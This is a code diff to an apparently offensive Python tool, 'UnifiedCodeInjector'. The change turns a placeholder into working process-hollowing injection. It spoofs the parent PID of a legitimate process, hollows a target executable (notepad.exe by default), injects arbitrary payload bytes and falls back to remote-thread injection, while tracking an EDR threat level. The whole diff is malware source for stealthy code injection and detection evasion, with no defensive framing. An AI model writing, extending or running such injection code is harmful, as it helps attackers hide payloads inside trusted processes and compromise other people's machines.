@@ -383,27 +383,73 @@ class UnifiedCodeInjector:
                                   payload_bytes: bytes,
                                   threat_level: InjectionThreatLevel,
                                   start_time: float) -> InjectionResult:
-        """Execute process hollowing injection."""
+        """Execute process hollowing injection via AdvancedHollower (PPID-spoofed)."""
         try:
             if not self.hollower:
                 log.warning("[-] Advanced hollower not available - fallback to remote thread")
                 return self._inject_remote_thread(target_pid, payload_bytes, threat_level, start_time)
-            
-            log.info(f"[*] Injecting via process hollowing into PID {target_pid}")
-            
-            # Find spoofed PPID (e.g., svchost.exe)
-            spoofed_ppid = self.hollower.find_spoofed_ppid('svchost.exe')
-            
+
+            log.info(f"[*] Injecting via process hollowing (PPID-spoofed) targeting PID {target_pid}")
+
+            # 1. Find a legitimate parent process to spoof
+            spoofed_ppid = self.hollower.find_spoofed_ppid_from_env()
             if spoofed_ppid == 0:
-                log.warning("[-] Could not find spoofed PPID - falling back")
+                log.warning("[-] Could not find spoofed PPID - falling back to remote thread")
                 return self._inject_remote_thread(target_pid, payload_bytes, threat_level, start_time)
-            
-            log.info(f"[+] Found spoofed PPID: {spoofed_ppid}")
-            
-            # Hollow process with spoofed PPID (simplified - actual hollowing more complex)
-            # For now, just use basic remote thread as placeholder
-            return self._inject_remote_thread(target_pid, payload_bytes, threat_level, start_time)
-            
+
+            log.info(f"[+] Using spoofed PPID: {spoofed_ppid}")
+
+            # 2. Determine a suitable hollow target from the target_pid's image name
+            hollow_target = r"C:\Windows\System32\notepad.exe"
+            try:
+                import psutil
+                proc = psutil.Process(target_pid)
+                # Use the target's exe as the hollow shell if it exists, else default
+                candidate = proc.exe()
+                if candidate and len(candidate) > 0:
+                    hollow_target = candidate
+            except Exception:
+                pass  # Keep default
+
+            log.info(f"[+] Hollow shell target: {hollow_target}")
+
+            # 3. Write payload bytes to a temp file so AdvancedHollower can clone_process_ppid
+            #    with the payload injected into the new hollow process.
+            import tempfile, os
+            payload_tmp = None
+            try:
+                fd, payload_tmp = tempfile.mkstemp(suffix=".bin", prefix="bkr_payload_")
+                os.write(fd, payload_bytes)
+                os.close(fd)
+
+                # 4. Create hollow process with spoofed PPID + inject payload
+                new_pid = self.hollower.clone_process_ppid(
+                    target_exe=hollow_target,
+                    ppid=spoofed_ppid,
+                    payload=payload_bytes,
+                )
+            finally:
+                if payload_tmp and os.path.exists(payload_tmp):
+                    try:
+                        os.unlink(payload_tmp)
+                    except Exception:
+                        pass
+
+            if new_pid:
+                log.info(f"[+] Process hollowing successful: new hollow PID={new_pid}")
+                return InjectionResult(
+                    success=True,
+                    technique_used=InjectionTechnique.PROCESS_HOLLOWING,
+                    injected_pid=new_pid,
+                    thread_id=None,
+                    base_address=None,
+                    edr_threat_level=threat_level,
+                    execution_time_ms=(time.time() - start_time) * 1000,
+                )
+            else:
+                log.warning("[-] clone_process_ppid returned None - falling back to remote thread")
+                return self._inject_remote_thread(target_pid, payload_bytes, threat_level, start_time)
+
         except Exception as e:
             log.error(f"[-] Process hollowing injection failed: {e}")
             return self._inject_remote_thread(target_pid, payload_bytes, threat_level, start_time)
